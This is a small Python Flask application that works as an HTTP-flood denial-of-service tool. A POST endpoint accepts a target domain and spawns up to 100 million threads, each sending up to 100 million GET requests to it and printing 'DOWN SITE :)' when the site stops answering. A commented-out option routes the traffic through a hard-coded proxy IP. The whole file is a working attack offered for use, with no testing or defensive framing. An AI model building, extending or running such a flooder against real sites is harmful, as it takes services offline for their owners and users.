import os
from flask import Flask, jsonify, request
from threading import Thread
import requests as req

app = Flask(__name__)
def ataque(dominio):
    print('DOMAIN ' + str(dominio))
    print('ATTACK START')
    num_max = 100000000
    for x in range(0, num_max):
        # proxies = {
        #    'http': 'http://190.61.32.146:999',
        # }
        # req.get(dominio,proxies=proxies)
        print('ATTACK #' + str(x))
        try:
            req.get(dominio)
        except:
            print('DOWN SITE :)')

@app.route("/", methods=['POST'])
def start():
    dominio = request.form['dominio']
    for x in range(0, 100000000):
        print(dominio)
        t = Thread(target=ataque, args=[dominio])
        t.start()
    data = {
        "domain": dominio,
    }
    return jsonify(data)
